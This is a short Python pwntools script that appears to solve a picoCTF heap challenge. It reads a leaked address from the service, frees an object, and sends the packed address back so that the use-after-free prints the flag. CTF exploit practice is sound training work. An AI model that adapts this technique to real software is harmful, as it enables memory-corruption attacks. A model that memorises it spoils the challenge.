
from pwn import *

r = remote('mercury.picoctf.net', 61817)  # replace with your port

r.recvuntil(b"it\n")
r.sendline(b's')
r.recvuntil(b"...")

payload = p32(int(r.recvline().strip(), 16))

r.recvuntil(b"it\n")
r.sendline(b'i')
r.recvuntil(b'?')
r.sendline(b'y')

r.recvuntil(b"it\n")
r.sendline(b'l')
r.recvline()
r.sendline(payload)

r.recvuntil(b':\n')
print(r.recvline().strip().decode())
